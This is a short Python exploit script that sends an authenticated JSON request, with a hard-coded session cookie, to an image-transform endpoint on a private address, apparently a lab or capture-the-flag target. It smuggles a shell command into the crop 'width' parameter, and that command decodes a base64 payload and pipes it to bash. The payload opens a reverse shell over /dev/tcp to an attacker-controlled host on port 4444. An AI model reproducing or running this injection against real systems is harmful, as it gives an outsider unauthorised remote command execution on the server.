import requests

BASE_URL = "http://10.10.11.88:8000/"
ENDPOINT = "apply_visual_transform"

sessionContentTypeHeader = {"Cookie" : "session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aN_eAw.FObcxxeYVxrGtH_n1xYtQlXlSFo",
	"Content-Type" : "application/json"}

payLoad = {"imageId" : "f0571910-eb84-475c-9124-85cef7eaefa7",
	"transformType" : "crop",
	"params" : {
	"x" : 12,
	"y" : 24,
	"width" : "; echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQ0NCAwPiYxCg== | base64 -d | bash #",
	"height" : 2222
	}

}

shellRequest = requests.post(BASE_URL+ENDPOINT, headers=sessionContentTypeHeader, json=payLoad)

print(shellRequest.text)